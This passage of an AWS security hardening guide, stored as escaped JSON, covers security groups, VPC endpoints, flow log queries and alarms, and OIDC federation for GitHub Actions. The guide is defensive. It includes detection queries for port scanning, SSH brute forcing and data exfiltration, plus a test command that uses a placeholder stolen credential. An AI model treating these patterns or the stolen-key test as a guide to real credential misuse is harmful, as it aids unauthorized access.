<alb-sg-id>\\n\\n# DB SG - only from App\\naws ec2 create-security-group \\\\\\n  --group-name db-sg \\\\\\n  --description \\\"RDS - from app servers only\\\" \\\\\\n  --vpc-id vpc-0123456789abcdef0\\n\\naws ec2 authorize-security-group-ingress \\\\\\n  --group-id <db-sg-id> --protocol tcp --port 5432 \\\\\\n  --source-group <app-sg-id>\\n```\\n\\n---\\n\\n## Checklist\\n\\n- [ ] No security group allows SSH (22) or RDP (3389) from `0.0.0.0/0`\\n- [ ] All SGs use source SG references instead of CIDRs where possible\\n- [ ] Outbound rules scoped \\u2014 no allow-all outbound on production instances\\n- [ ] Unused security groups identified and deleted\\n- [ ] AWS Config rules: `INCOMING_SSH_DISABLED`, `RESTRICTED_INCOMING_TRAFFIC` active\\n- [ ] Security groups are per-tier (ALB, App, DB) \\u2014 not shared across resources\\n\"}, {\"slug\": \"02-vpc-endpoints\", \"title\": \"VPC Endpoints \\u2014 Keep AWS Traffic Off the Public Internet\", \"content\": \"# VPC Endpoints \\u2014 Keep AWS Traffic Off the Public Internet\\n\\n## The Problem\\n\\nWithout VPC endpoints, traffic to AWS services (S3, DynamoDB, STS, etc.) leaves your VPC, travels over the public internet, and returns. This means stolen credentials work from anywhere, and sensitive data is routed unnecessarily over public networks.\\n\\n---\\n\\n## Types of VPC Endpoints\\n\\n```\\nGateway Endpoints          Interface Endpoints\\n\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500          \\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\nFree                       Hourly + data cost\\nS3 and DynamoDB only       Most other AWS services\\nRoute table entry          ENI in your subnet\\n                           Supports PrivateLink\\n```\\n\\n---\\n\\n## The Key Security Benefit\\n\\n```bash\\n# Without VPC endpoint:\\n# EC2 \\u2192 Internet Gateway \\u2192 Public AWS S3 endpoint\\n# Stolen credentials usable from ANYWHERE on the internet\\n\\n# With VPC endpoint + bucket policy:\\n# EC2 \\u2192 VPC Endpoint \\u2192 S3 (stays in AWS network)\\n# Stolen credentials ONLY work from inside your VPC\\n```\\n\\n---\\n\\n## Detection \\u2014 Check for Missing VPC Endpoints\\n\\n```bash\\n# List existing VPC endpoints in your VPC\\naws ec2 describe-vpc-endpoints \\\\\\n  --filters \\\"Name=vpc-id,Values=vpc-0123456789abcdef0\\\" \\\\\\n  --query 'VpcEndpoints[*].[VpcEndpointId,ServiceName,State]' \\\\\\n  --output table\\n\\n# Check if S3 gateway endpoint exists\\naws ec2 describe-vpc-endpoints \\\\\\n  --filters \\\"Name=service-name,Values=com.amazonaws.ap-south-1.s3\\\" \\\\\\n             \\\"Name=vpc-id,Values=vpc-0123456789abcdef0\\\" \\\\\\n  --query 'VpcEndpoints[*].[VpcEndpointId,State,VpcEndpointType]'\\n\\n# Find all available AWS endpoint services in your region\\naws ec2 describe-vpc-endpoint-services \\\\\\n  --query 'ServiceNames' --output text | tr '\\\\t' '\\\\n' | sort\\n```\\n\\n---\\n\\n## Fix \\u2014 Create VPC Endpoints\\n\\n### Gateway Endpoint for S3 (Free)\\n```bash\\n# Get your route table IDs for private subnets\\naws ec2 describe-route-tables \\\\\\n  --filters \\\"Name=vpc-id,Values=vpc-0123456789abcdef0\\\" \\\\\\n  --query 'RouteTables[*].[RouteTableId,Tags[?Key==`Name`].Value|[0]]' \\\\\\n  --output table\\n\\n# Create S3 gateway endpoint\\naws ec2 create-vpc-endpoint \\\\\\n  --vpc-id vpc-0123456789abcdef0 \\\\\\n  --service-name com.amazonaws.ap-south-1.s3 \\\\\\n  --route-table-ids rtb-0123456789abcdef0 rtb-abcdef0123456789  # all private route tables\\n  --vpc-endpoint-type Gateway\\n\\n# Create DynamoDB gateway endpoint\\naws ec2 create-vpc-endpoint \\\\\\n  --vpc-id vpc-0123456789abcdef0 \\\\\\n  --service-name com.amazonaws.ap-south-1.dynamodb \\\\\\n  --route-table-ids rtb-0123456789abcdef0 \\\\\\n  --vpc-endpoint-type Gateway\\n```\\n\\n### Interface Endpoint for STS (Prevents Credential Use Outside VPC)\\n```bash\\n# Create STS interface endpoint\\naws ec2 create-vpc-endpoint \\\\\\n  --vpc-id vpc-0123456789abcdef0 \\\\\\n  --service-name com.amazonaws.ap-south-1.sts \\\\\\n  --vpc-endpoint-type Interface \\\\\\n  --subnet-ids subnet-private-1 subnet-private-2 \\\\\\n  --security-group-ids sg-vpce-sg \\\\\\n  --private-dns-enabled  # Overrides public DNS \\u2014 all STS calls go through endpoint\\n```\\n\\n---\\n\\n## Lock Down S3 Bucket \\u2014 Deny Access Outside VPC\\n\\n```bash\\n# Add a bucket policy that blocks all access not coming through your VPC endpoint\\naws s3api put-bucket-policy \\\\\\n  --bucket my-sensitive-bucket \\\\\\n  --policy '{\\n    \\\"Version\\\": \\\"2012-10-17\\\",\\n    \\\"Statement\\\": [\\n      {\\n        \\\"Effect\\\": \\\"Allow\\\",\\n        \\\"Principal\\\": \\\"*\\\",\\n        \\\"Action\\\": \\\"s3:*\\\",\\n        \\\"Resource\\\": [\\n          \\\"arn:aws:s3:::my-sensitive-bucket\\\",\\n          \\\"arn:aws:s3:::my-sensitive-bucket/*\\\"\\n        ]\\n      },\\n      {\\n        \\\"Effect\\\": \\\"Deny\\\",\\n        \\\"Principal\\\": \\\"*\\\",\\n        \\\"Action\\\": \\\"s3:*\\\",\\n        \\\"Resource\\\": [\\n          \\\"arn:aws:s3:::my-sensitive-bucket\\\",\\n          \\\"arn:aws:s3:::my-sensitive-bucket/*\\\"\\n        ],\\n        \\\"Condition\\\": {\\n          \\\"StringNotEquals\\\": {\\n            \\\"aws:SourceVpce\\\": \\\"vpce-0123456789abcdef0\\\"\\n          }\\n        }\\n      }\\n    ]\\n  }'\\n\\n# Test \\u2014 should work from inside VPC\\naws s3 ls s3://my-sensitive-bucket\\n\\n# Test \\u2014 should fail from outside VPC (e.g., your laptop with stolen creds)\\nAWS_ACCESS_KEY_ID=stolen-key aws s3 ls s3://my-sensitive-bucket\\n# Access Denied \\u2014 even with valid credentials\\n```\\n\\n---\\n\\n## Recommended Endpoints to Create\\n\\n| Service | Type | Why |\\n|---|---|---|\\n| S3 | Gateway (free) | Most apps use S3 \\u2014 keep traffic off internet |\\n| DynamoDB | Gateway (free) | Same \\u2014 high traffic service |\\n| STS | Interface | Prevent stolen tokens from working outside VPC |\\n| SSM | Interface | Required for Session Manager without internet |\\n| EC2 | Interface | Instance metadata and API calls |\\n| Secrets Manager | Interface | Secret fetching stays private |\\n| CloudWatch Logs | Interface | Log shipping stays in VPC |\\n\\n---\\n\\n## Checklist\\n\\n- [ ] S3 gateway endpoint exists for all VPCs with S3-accessing workloads\\n- [ ] DynamoDB gateway endpoint created\\n- [ ] STS interface endpoint created \\u2014 credential usage restricted to VPC\\n- [ ] S3 bucket policies deny access outside VPC endpoint\\n- [ ] SSM interface endpoints created \\u2014 enables Session Manager in private subnets\\n- [ ] VPC endpoint policies scoped (not open to all principals/actions)\\n\"}, {\"slug\": \"03-flow-logs\", \"title\": \"VPC Flow Logs \\u2014 Network Visibility and Threat Detection\", \"content\": \"# VPC Flow Logs \\u2014 Network Visibility and Threat Detection\\n\\n## The Problem\\n\\nWithout flow logs you are blind. You cannot detect data exfiltration, lateral movement, port scanning, or unexpected connections. When an incident happens, you have no forensic evidence.\\n\\n---\\n\\n## What Flow Logs Capture\\n\\n```\\n<version> <account-id> <interface-id> <srcaddr> <dstaddr> <srcport>\\n<dstport> <protocol> <packets> <bytes> <start> <end> <action> <log-status>\\n\\nExample \\u2014 accepted connection:\\n2 123456789 eni-0abc123 10.0.1.5 10.0.2.10 54321 5432 6 15 1200 1609459200 1609459260 ACCEPT OK\\n\\nExample \\u2014 rejected connection (port scan or unauthorized access attempt):\\n2 123456789 eni-0abc123 185.220.101.5 10.0.1.5 45678 22 6 1 40 1609459200 1609459210 REJECT OK\\n```\\n\\n---\\n\\n## Detection \\u2014 Check if Flow Logs Are Enabled\\n\\n```bash\\n# Check flow logs for a specific VPC\\naws ec2 describe-flow-logs \\\\\\n  --filter \\\"Name=resource-id,Values=vpc-0123456789abcdef0\\\" \\\\\\n  --query 'FlowLogs[*].[FlowLogId,ResourceId,TrafficType,LogDestinationType,DeliverLogsStatus]' \\\\\\n  --output table\\n\\n# Check all flow logs in the account\\naws ec2 describe-flow-logs \\\\\\n  --query 'FlowLogs[*].[ResourceId,TrafficType,LogDestinationType,DeliverLogsStatus]' \\\\\\n  --output table\\n\\n# AWS Config rule \\u2014 flag VPCs without flow logs\\naws configservice put-config-rule \\\\\\n  --config-rule '{\\n    \\\"ConfigRuleName\\\": \\\"vpc-flow-logs-enabled\\\",\\n    \\\"Source\\\": {\\n      \\\"Owner\\\": \\\"AWS\\\",\\n      \\\"SourceIdentifier\\\": \\\"VPC_FLOW_LOGS_ENABLED\\\"\\n    }\\n  }'\\n```\\n\\n---\\n\\n## Fix \\u2014 Enable Flow Logs\\n\\n### To CloudWatch Logs\\n```bash\\n# Create IAM role for flow logs to write to CloudWatch\\naws iam create-role \\\\\\n  --role-name VPCFlowLogsRole \\\\\\n  --assume-role-policy-document '{\\n    \\\"Version\\\": \\\"2012-10-17\\\",\\n    \\\"Statement\\\": [{\\n      \\\"Effect\\\": \\\"Allow\\\",\\n      \\\"Principal\\\": {\\\"Service\\\": \\\"vpc-flow-logs.amazonaws.com\\\"},\\n      \\\"Action\\\": \\\"sts:AssumeRole\\\"\\n    }]\\n  }'\\n\\naws iam put-role-policy \\\\\\n  --role-name VPCFlowLogsRole \\\\\\n  --policy-name FlowLogsPolicy \\\\\\n  --policy-document '{\\n    \\\"Version\\\": \\\"2012-10-17\\\",\\n    \\\"Statement\\\": [{\\n      \\\"Effect\\\": \\\"Allow\\\",\\n      \\\"Action\\\": [\\n        \\\"logs:CreateLogGroup\\\",\\n        \\\"logs:CreateLogStream\\\",\\n        \\\"logs:PutLogEvents\\\",\\n        \\\"logs:DescribeLogGroups\\\"\\n      ],\\n      \\\"Resource\\\": \\\"*\\\"\\n    }]\\n  }'\\n\\n# Enable flow logs to CloudWatch\\naws ec2 create-flow-logs \\\\\\n  --resource-type VPC \\\\\\n  --resource-ids vpc-0123456789abcdef0 \\\\\\n  --traffic-type ALL \\\\\\n  --log-destination-type cloud-watch-logs \\\\\\n  --log-group-name /aws/vpc/flowlogs \\\\\\n  --deliver-logs-permission-arn arn:aws:iam::123456789:role/VPCFlowLogsRole\\n```\\n\\n### To S3 (Cheaper for Long-term Retention)\\n```bash\\naws ec2 create-flow-logs \\\\\\n  --resource-type VPC \\\\\\n  --resource-ids vpc-0123456789abcdef0 \\\\\\n  --traffic-type ALL \\\\\\n  --log-destination-type s3 \\\\\\n  --log-destination arn:aws:s3:::my-flow-logs-bucket/vpc-logs/ \\\\\\n  --log-format '${version} ${account-id} ${interface-id} ${srcaddr} ${dstaddr} ${srcport} ${dstport} ${protocol} ${packets} ${bytes} ${start} ${end} ${action} ${log-status}'\\n```\\n\\n---\\n\\n## Querying Flow Logs with CloudWatch Insights\\n\\n```bash\\n# Find top talkers \\u2014 which IPs are sending the most traffic\\naws logs start-query \\\\\\n  --log-group-name /aws/vpc/flowlogs \\\\\\n  --start-time $(date -d '1 hour ago' +%s) \\\\\\n  --end-time $(date +%s) \\\\\\n  --query-string '\\n    fields srcaddr, dstaddr, bytes\\n    | stats sum(bytes) as totalBytes by srcaddr, dstaddr\\n    | sort totalBytes desc\\n    | limit 20'\\n\\n# Find all REJECTED connections \\u2014 potential port scanning or intrusion attempts\\naws logs start-query \\\\\\n  --log-group-name /aws/vpc/flowlogs \\\\\\n  --start-time $(date -d '1 hour ago' +%s) \\\\\\n  --end-time $(date +%s) \\\\\\n  --query-string '\\n    fields srcaddr, dstaddr, dstport, action\\n    | filter action = \\\"REJECT\\\"\\n    | stats count(*) as attempts by srcaddr, dstport\\n    | sort attempts desc\\n    | limit 20'\\n\\n# Detect potential data exfiltration \\u2014 large outbound transfers\\naws logs start-query \\\\\\n  --log-group-name /aws/vpc/flowlogs \\\\\\n  --start-time $(date -d '1 hour ago' +%s) \\\\\\n  --end-time $(date +%s) \\\\\\n  --query-string '\\n    fields srcaddr, dstaddr, bytes, dstport\\n    | filter bytes > 10000000\\n    | filter srcaddr like /^10\\\\./\\n    | sort bytes desc'\\n\\n# Get query results\\naws logs get-query-results --query-id <query-id>\\n```\\n\\n---\\n\\n## CloudWatch Alarms on Flow Log Patterns\\n\\n```bash\\n# Create metric filter \\u2014 count rejected SSH connections\\naws logs put-metric-filter \\\\\\n  --log-group-name /aws/vpc/flowlogs \\\\\\n  --filter-name RejectedSSH \\\\\\n  --filter-pattern '[version, account, eni, source, destination, srcport, destport=\\\"22\\\", protocol, packets, bytes, windowstart, windowend, action=\\\"REJECT\\\", flowlogstatus]' \\\\\\n  --metric-transformations \\\\\\n    metricName=RejectedSSHCount,metricNamespace=VPCFlowLogs,metricValue=1\\n\\n# Alarm if more than 10 rejected SSH attempts in 5 minutes\\naws cloudwatch put-metric-alarm \\\\\\n  --alarm-name HighRejectedSSH \\\\\\n  --alarm-description \\\"Port scanning or SSH brute force detected\\\" \\\\\\n  --metric-name RejectedSSHCount \\\\\\n  --namespace VPCFlowLogs \\\\\\n  --statistic Sum \\\\\\n  --period 300 \\\\\\n  --threshold 10 \\\\\\n  --comparison-operator GreaterThanThreshold \\\\\\n  --evaluation-periods 1 \\\\\\n  --alarm-actions arn:aws:sns::123456789:SecurityAlerts\\n```\\n\\n---\\n\\n## Checklist\\n\\n- [ ] Flow logs enabled on all VPCs \\u2014 traffic type ALL\\n- [ ] Logs shipping to CloudWatch for querying + S3 for long-term retention\\n- [ ] Log retention policy set (e.g., 90 days CloudWatch, 1 year S3)\\n- [ ] CloudWatch Insights queries saved for common investigation patterns\\n- [ ] Metric filters + alarms on rejected connections, port scans, large transfers\\n- [ ] GuardDuty enabled \\u2014 it analyzes flow logs automatically for threats\\n\"}], \"tags\": [\"security-groups\", \"vpc-endpoints\", \"flow-logs\"], \"desc\": \"Security group hardening, VPC endpoints to contain stolen credentials, flow log forensics\"}, {\"id\": \"04-cicd-pipeline\", \"num\": \"04\", \"name\": \"CI/CD Pipeline\", \"readme\": \"# 04 \\u2014 CI/CD Pipeline Security\\n\\nCI/CD pipelines are high-value targets \\u2014 they have AWS credentials, access to source code, and the ability to deploy to production. A compromised pipeline = a compromised production environment.\\n\\n## Topics\\n\\n| File | Topic |\\n|------|-------|\\n| [01-oidc-auth.md](./01-oidc-auth.md) | Replacing static keys with OIDC federation |\\n| [02-secrets-management.md](./02-secrets-management.md) | Managing secrets in pipelines securely |\\n| [03-pipeline-hardening.md](./03-pipeline-hardening.md) | General pipeline hardening practices |\\n\\n## Key Threat Model\\n\\n```\\nStatic AWS Keys in CI        Secrets in Plaintext         Supply Chain Attack\\n        \\u2502                           \\u2502                             \\u2502\\n        \\u25bc                           \\u25bc                             \\u25bc\\nKey leaked in logs or       Secrets visible in build     Malicious dependency\\nrepo = permanent access     logs or env dump             reads env vars + exfils\\n```\\n\\n## Top 5 CI/CD Controls\\n\\n1. Use OIDC for GitHub Actions / GitLab CI \\u2014 eliminate static AWS keys entirely\\n2. Never print environment variables in CI logs\\n3. Store secrets in AWS Secrets Manager \\u2014 not CI/CD platform variables\\n4. Scope deployment roles to least privilege per environment\\n5. Pin third-party actions to a commit SHA \\u2014 not a mutable tag\\n\", \"docs\": [{\"slug\": \"01-oidc-auth\", \"title\": \"OIDC Authentication for CI/CD \\u2014 No Static Keys\", \"content\": \"# OIDC Authentication for CI/CD \\u2014 No Static Keys\\n\\n## The Problem\\n\\nStoring `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` in GitHub Secrets or GitLab CI variables means you have permanent credentials sitting in your CI platform. If the platform is breached, or someone with repo access accidentally logs them, they're compromised.\\n\\n---\\n\\n## How OIDC Works for CI/CD\\n\\n```\\nGitHub Actions runner starts\\n        \\u2502\\n        \\u25bc\\nGitHub generates a short-lived OIDC token (JWT) for this specific job\\n        \\u2502\\n        \\u25bc\\nJob sends OIDC token to AWS STS: AssumeRoleWithWebIdentity\\n        \\u2502\\n        \\u25bc\\nSTS validates token with GitHub's OIDC provider\\n        \\u2502\\n        \\u25bc\\nSTS returns temporary credentials (valid for job duration only)\\n        \\u2502\\n        \\u25bc\\nJob uses credentials \\u2014 they expire when the job ends\\n        \\u2502\\n        \\u25bc\\nNo static keys stored anywhere\\n```\\n\\n---\\n\\n## Setup \\u2014 GitHub Actions with AWS OIDC\\n\\n### Step 1 \\u2014 Create OIDC Identity Provider in AWS\\n```bash\\n# Add GitHub as a trusted OIDC provider\\naws iam create-open-id-connect-provider \\\\\\n  --url https://token.actions.githubusercontent.com \\\\\\n  --client-id-list sts.amazonaws.com \\\\\\n  --thumbprint-list 6938fd4d98bab03faadb97b34396831e3780aea1\\n\\n# Verify it was created\\naws iam list-open-id-connect-providers\\n```\\n\\n### Step 2 \\u2014 Create IAM Role for GitHub Actions\\n```bash\\n# Create the role with a trust policy scoped to your specific repo\\naws iam create-role \\\\\\n  --role-name GitHubActionsDeployRole \\\\\\n  --assume-role-policy-document '{\\n    \\\"Version\\\": \\\"2012-10-17\\\",\\n    \\\"Statement\\\": [{\\n      \\\"Effect\\\": \\\"Allow\\\",\\n      \\\"Principal\\\": {\\n        \\\"Federated\\\": \\\"arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com\\\"\\n      },\\n      \\\"Action\\\": \\\"sts:AssumeRoleWithWebIdentity\\\",\\n      \\\"Condition\\\": {\\n        \\\"StringEquals\\\": {\\n          \\\"token.actions.githubusercontent.com:aud\\\": \\\"sts.amazonaws.com\\\"\\n        },\\n        \\\"StringLike\\\": {\\n          \\\"token.actions.githubusercontent.com:sub\\\": \\\"repo:sharanch/my-app:*\\\"\\n        }\\n      }\\n    }]\\n  }'\\n\\n# Attach only the permissions the pipeline actually needs\\naws iam attach-role-policy \\\\\\n  --role-name GitHubActionsDeployRole \\\\\\n  --policy-arn arn:aws:iam::aws:policy/AmazonECRContainerRegistryFullAccess\\n\\n# Scope further \\u2014 only push to specific ECR repo\\naws iam put-role-policy \\\\\\n  --role-name GitHubActionsDeployRole \\\\\\n  --policy-name ECRPushOnly \\\\\\n  --policy-document '{\\n    \\\"Version\\\": \\\"2012-10-17\\\",\\n    \\\"Statement\\\": [{\\n      \\\"Effect\\\": \\\"Allow\\\",\\n      \\\"Action\\\": [\\n        \\\"ecr:GetAuthorizationToken\\\",\\n        \\\"ecr:BatchCheckLayerAvailability\\\",\\n        \\\"ecr:PutImage\\\",\\n        \\\"ecr:InitiateLayerUpload\\\",\\n        \\\"ecr:UploadLayerPart\\\",\\n        \\\"ecr:CompleteLayerUpload\\\"\\n      ],\\n      \\\"Resource\\\": \\\"arn:aws:ecr:ap-south-1:123456789:repository/my-app\\\"\\n    },\\n    {\\n      \\\"Effect\\\": \\\"Allow\\\",\\n      \\\"Action\\\": \\\"ecr:GetAuthorizationToken\\\",\\n      \\\"Resource\\\": \\\"*\\\"\\n    }]\\n  }'\\n```\\n\\n### Step 3 \\u2014 Use in GitHub Actions Workflow\\n```yaml\\n# .github/workflows/deploy.yml\\nname: Deploy\\n\\non:\\n  push:\\n    branches: [main]\\n\\npermissions:\\n  id-token: write   # Required for OIDC\\n  contents: read\\n\\njobs:\\n  deploy:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - uses: actions/checkout@v4\\n\\n      - name: Configure AWS credentials via OIDC\\n        uses: aws-actions/configure-aws-credentials@v4\\n        with:\\n          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsDeployRole\\n          aws-region: ap-south-1\\n          # No AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY needed\\n\\n      - name: Verify identity\\n        run: aws sts get-caller-identity\\n\\n      - name: Build and push to ECR\\n        run: |\\n          aws ecr get-login-password | dock
